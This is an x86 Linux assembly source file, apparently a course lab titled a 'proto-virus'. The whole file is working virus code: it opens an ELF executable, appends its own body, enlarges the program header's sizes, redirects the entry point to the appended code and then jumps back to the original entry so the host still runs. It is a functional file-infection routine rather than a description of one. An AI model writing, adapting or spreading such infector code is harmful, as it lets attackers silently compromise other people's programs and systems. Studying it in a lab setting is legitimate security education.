%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8

%define M_NUMS 4
%define FDesc 8
%define file_size 12
%define programHeader 50
%define ELFHeader 150
%define newEnPoint 200
%define oldEnPoint 196
	
	global _start

	section .text
_start:	
	push ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage

	call getMyLoc
	sub ebx, next-msg

	write 1,ebx,12

    call getMyLoc
	sub ebx ,next-FileName

	open ebx, RDWR, 0

	cmp eax, 0
	jl IllegalExit

	mov [ebp-FDesc], eax
	mov ebx,ebp
	sub ebx,M_NUMS

	read [ebp-FDesc], ebx, 4

	cmp dword [ebp-M_NUMS], 0x464c457f
	jne IllegalFile

	lseek [ebp-FDesc],0,SEEK_SET
	lseek [ebp-FDesc], 0, SEEK_END

	;cmp SEEK_SET, eax
	;je IllegalExit

	mov [ebp-file_size], eax

	call getMyLoc
	sub ebx, next-_start

	write [ebp-FDesc], ebx, virus_end-_start

	lseek [ebp-FDesc], 84, SEEK_SET

	mov ebx,ebp
	sub ebx, programHeader

	read [ebp-FDesc], ebx, 32

	.DEBUG:
	mov ebx, [ebp-programHeader+8]
	add ebx, [ebp-file_size]
	sub ebx, [ebp-programHeader+4]  ;substracting offset from entry point
	mov [ebp-newEnPoint], ebx
	
	mov ebx, [ebp-programHeader+16]
	add ebx, virus_end-_start
	mov [ebp-programHeader+16], ebx
	mov [ebp-programHeader+20], ebx
	
	lseek [ebp-FDesc], 84, SEEK_SET

	mov ebx, ebp
	sub ebx, programHeader

	write [ebp-FDesc], ebx, 32

	lseek [ebp-FDesc],24, SEEK_SET

	mov ebx,ebp
	sub ebx,oldEnPoint

	read [ebp-FDesc],ebx,4

	lseek [ebp-FDesc],24, SEEK_SET

	mov ebx, ebp
	sub ebx, newEnPoint

	write [ebp-FDesc],ebx, 4
	
	lseek [ebp-FDesc],-4,SEEK_END

	mov ebx,ebp
	sub ebx,oldEnPoint
	 
	write [ebp-FDesc],ebx,4
	
	close [ebp-FDesc]
	call getMyLoc
	sub ebx,next-PreviousEntryPoint
	jmp [ebx]
	
	



; You code for this lab goes here
getMyLoc:
    call next
next:
    pop ebx
    ret


IllegalFile:
    call getMyLoc
    sub ebx, next-notELF
    write 2,ebx,9
    call getMyLoc
    sub ebx, next-PreviousEntryPoint
	jmp [ebx]
    
IllegalExit:
    call getMyLoc
    sub ebx, next-notOpen
    write 2,ebx,10
    call getMyLoc
    sub ebx, next-PreviousEntryPoint
	jmp [ebx]

VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
	
FileName:	db "ELFexec", 0
FileNameLenght: dd $-FileName
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:    db "perhaps not", 10 , 0
msg:        db "Im a virus",10,0
notELF:     db "not elf",10,0
notOpen:    db "not open",10,0
MsgLength: dd $-msg
	
PreviousEntryPoint: dd VirusExit
virus_end:


